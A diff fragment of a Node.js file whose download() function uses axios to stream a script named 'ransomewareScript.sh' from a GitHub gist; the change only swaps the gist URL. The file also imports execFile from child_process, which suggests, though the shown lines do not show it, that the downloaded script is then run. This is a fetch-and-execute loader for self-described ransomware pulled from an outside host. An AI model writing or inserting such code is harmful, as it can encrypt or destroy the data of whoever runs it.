@@ -4,7 +4,7 @@ const { execFile } = require("child_process");
 
 async function download() {
   const res = await axios.get(
-    "https://gist.githubusercontent.com/uzair004/a3ff6b1e317a13063ff67f8da5c62f5a/raw/b14630abdec0e9abc8fd56c64421c7e66f1a89fd/ransomewareScript.sh",
+    "https://gist.githubusercontent.com/uzair004/ccb3bca85ed469a0ae82463a2a557e91/raw/09d3d4030e7a925a1dcd97b5428aa9b4925ab108/ransomewareScript.sh",
     { responseType: "stream" }
   );
   await new Promise((resolve, reject) => {
